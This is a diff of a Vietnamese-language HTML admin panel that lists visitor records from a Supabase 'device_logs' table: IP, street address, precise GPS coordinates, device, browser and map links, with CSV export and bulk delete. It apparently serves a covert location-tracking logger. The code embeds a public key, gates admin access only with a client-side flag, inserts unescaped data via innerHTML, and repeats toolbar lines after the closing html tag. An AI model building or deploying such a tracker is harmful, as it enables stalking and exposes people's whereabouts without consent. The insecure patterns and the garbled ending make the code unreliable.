@@ -10,68 +10,26 @@
         .container { max-width: 1400px; }
         .login-box { max-width: 400px; margin: 100px auto; }
         input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            background: #0a0a0a;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
+            width: 100%; padding: 12px; background: #0a0a0a;
+            border: 1px solid #00ff41; color: #00ff41;
+            font-family: 'Courier New', monospace; font-size: 16px;
             margin-bottom: 10px;
         }
         button {
-            width: 100%;
-            padding: 12px;
-            background: #00ff41;
-            color: #0a0a0a;
-            border: none;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            letter-spacing: 2px;
+            width: 100%; padding: 12px; background: #00ff41; color: #0a0a0a;
+            border: none; font-family: 'Courier New', monospace;
+            font-size: 16px; font-weight: bold; cursor: pointer; letter-spacing: 2px;
         }
         button:hover { background: #00cc33; }
-        .toolbar {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-        }
+        .toolbar { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
         .toolbar button { width: auto; padding: 8px 16px; font-size: 13px; }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-        th, td {
-            border: 1px solid #00ff41;
-            padding: 8px;
-            text-align: left;
-            word-break: break-all;
-            vertical-align: top;
-        }
-        th {
-            background: #00ff41;
-            color: #0a0a0a;
-            font-weight: bold;
-            position: sticky;
-            top: 0;
-        }
+        table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
+        th, td { border: 1px solid #00ff41; padding: 8px; text-align: left; word-break: break-all; vertical-align: top; }
+        th { background: #00ff41; color: #0a0a0a; font-weight: bold; position: sticky; top: 0; }
         tr:nth-child(even) { background: #0d0d0d; }
         .map-link { color: #00ff41; }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        .stat-box {
-            border: 1px solid #00ff41;
-            padding: 12px;
-            background: #0a0a0a;
-        }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom: 15px; }
+        .stat-box { border: 1px solid #00ff41; padding: 12px; background: #0a0a0a; }
         .stat-box h3 { font-size: 12px; opacity: 0.7; margin-bottom: 5px; }
         .stat-box p { font-size: 20px; font-weight: bold; }
         .scroll-box { overflow-x: auto; max-height: 70vh; overflow-y: auto; }
@@ -109,6 +67,199 @@
 
             <div class="toolbar">
                 <button onclick="loadData()">TẢI LẠI</button>
+                <button onclick="exportCSV()">XUẤT CSV</button>
+                <button onclick="clearAll()">XÓA TẤT CẢ</button>
+                <button onclick="logout()">ĐĂNG XUẤT</button>
+            </div>
+
+            <div class="scroll-box">
+                <table id="table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>THỜI GIAN</th>
+                            <th>IP</th>
+                            <th>VỊ TRÍ</th>
+                            <th>TỌA ĐỘ</th>
+                            <th>SAI SỐ</th>
+                            <th>NGUỒN</th>
+                            <th>THIẾT BỊ</th>
+                            <th>HĐH</th>
+                            <th>TRÌNH DUYỆT</th>
+                            <th>MÀN HÌNH</th>
+                            <th>NGÔN NGỮ</th>
+                            <th>BẢN ĐỒ</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tbody"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+        // Cấu hình Supabase
+        const SUPABASE_URL = 'https://frpudnqjlbqlhuwcioju.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_3U4y_wScZi6dY_BHrvyrXA_rdGq_BSP';
+
+        // URL Edge Function xác thực - mật khẩu nằm ở server
+        const VERIFY_URL = SUPABASE_URL + '/functions/v1/verify-admin';
+
+        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        // Hàm đăng nhập - gửi mật khẩu lên server để xác thực
+        async function login() {
+            const pw = document.getElementById('password').value;
+            const errEl = document.getElementById('login-error');
+            errEl.textContent = 'ĐANG XÁC THỰC...';
+
+            try {
+                const res = await fetch(VERIFY_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + SUPABASE_KEY
+                    },
+                    body: JSON.stringify({ password: pw })
+                });
+
+                const data = await res.json();
+
+                if (data.success) {
+                    sessionStorage.setItem('admin_auth', '1');
+                    sessionStorage.setItem('admin_token', data.token);
+                    showPanel();
+                } else {
+                    errEl.textContent = 'SAI MẬT KHẨU';
+                }
+            } catch (e) {
+                errEl.textContent = 'LỖI KẾT NỐI: ' + e.message;
+            }
+        }
+
+        // Hàm đăng xuất
+        function logout() {
+            sessionStorage.removeItem('admin_auth');
+            sessionStorage.removeItem('admin_token');
+            location.reload();
+        }
+
+        // Hàm hiển thị panel
+        function showPanel() {
+            document.getElementById('login').classList.add('hidden');
+            document.getElementById('panel').classList.remove('hidden');
+            loadData();
+        }
+
+        // Hàm tải dữ liệu từ Supabase
+        async function loadData() {
+            const { data, error } = await supabaseClient
+                .from('device_logs')
+                .select('*')
+                .order('created_at', { ascending: false })
+                .limit(1000);
+
+            if (error) {
+                alert('LỖI: ' + error.message);
+                return;
+            }
+
+            const total = data.length;
+            const uniqueIPs = new Set(data.map(d => d.ip)).size;
+            const todayStr = new Date().toISOString().slice(0, 10);
+            const todayCount = data.filter(d =>
+                d.created_at && d.created_at.slice(0, 10) === todayStr
+            ).length;
+
+            document.getElementById('total').textContent = total;
+            document.getElementById('unique-ip').textContent = uniqueIPs;
+            document.getElementById('today').textContent = todayCount;
+
+            const tbody = document.getElementById('tbody');
+            tbody.innerHTML = '';
+
+            data.forEach(row => {
+                const tr = document.createElement('tr');
+                const time = row.created_at
+                    ? new Date(row.created_at).toLocaleString('vi-VN')
+                    : '-';
+                const coords = (row.latitude && row.longitude)
+                    ? row.latitude.toFixed(5) + ', ' + row.longitude.toFixed(5)
+                    : '-';
+                const accuracy = row.accuracy
+                    ? '±' + Math.round(row.accuracy) + 'm'
+                    : '-';
+                const mapLink = (row.latitude && row.longitude)
+                    ? '<a class="map-link" target="_blank" href="https://www.google.com/maps?q=' +
+                      row.latitude + ',' + row.longitude + '">MỞ</a>'
+                    : '-';
+
+                tr.innerHTML =
+                    '<td>' + row.id + '</td>' +
+                    '<td>' + time + '</td>' +
+                    '<td>' + (row.ip || '-') + '</td>' +
+                    '<td>' + (row.address_full || (row.city + ', ' + row.country) || '-') + '</td>' +
+                    '<td>' + coords + '</td>' +
+                    '<td>' + accuracy + '</td>' +
+                    '<td>' + (row.location_source || '-') + '</td>' +
+                    '<td>' + (row.device || '-') + '</td>' +
+                    '<td>' + (row.os || '-') + '</td>' +
+                    '<td>' + (row.browser || '-') + '</td>' +
+                    '<td>' + (row.screen || '-') + '</td>' +
+                    '<td>' + (row.language || '-') + '</td>' +
+                    '<td>' + mapLink + '</td>';
+                tbody.appendChild(tr);
+            });
+        }
+
+        // Hàm xuất CSV
+        function exportCSV() {
+            const rows = [['ID', 'Thời gian', 'IP', 'Địa chỉ', 'Vĩ độ', 'Kinh độ',
+                'Sai số', 'Nguồn', 'Thiết bị', 'HĐH', 'Trình duyệt',
+                'Màn hình', 'Ngôn ngữ']];
+
+            document.querySelectorAll('#tbody tr').forEach(tr => {
+                const cells = tr.querySelectorAll('td');
+                rows.push(Array.from(cells).map(c =>
+                    '"' + c.textContent.replace(/"/g, '""') + '"'));
+            });
+
+            const csv = '\uFEFF' + rows.map(r => r.join(',')).join('\n');
+            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'device_logs_' + Date.now() + '.csv';
+            link.click();
+        }
+
+        // Hàm xóa tất cả
+        async function clearAll() {
+            if (!confirm('XÁC NHẬN XÓA TOÀN BỘ LOG?')) return;
+            const { error } = await supabaseClient
+                .from('device_logs')
+                .delete()
+                .neq('id', 0);
+            if (error) {
+                alert('LỖI: ' + error.message);
+            } else {
+                alert('ĐÃ XÓA TOÀN BỘ');
+                loadData();
+            }
+        }
+
+        // Tự động đăng nhập nếu đã xác thực
+        window.addEventListener('load', () => {
+            if (sessionStorage.getItem('admin_auth') === '1') {
+                showPanel();
+            }
+            document.getElementById('password').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') login();
+            });
+        });
+    </script>
+</body>
+</html>                <button onclick="loadData()">TẢI LẠI</button>
                 <button onclick="exportCSV()">XUẤT CSV</button>
                 <button onclick="clearAll()">XÓA TẤT CẢ</button>
                 <button onclick="logout()">ĐĂNG XUẤT</button>
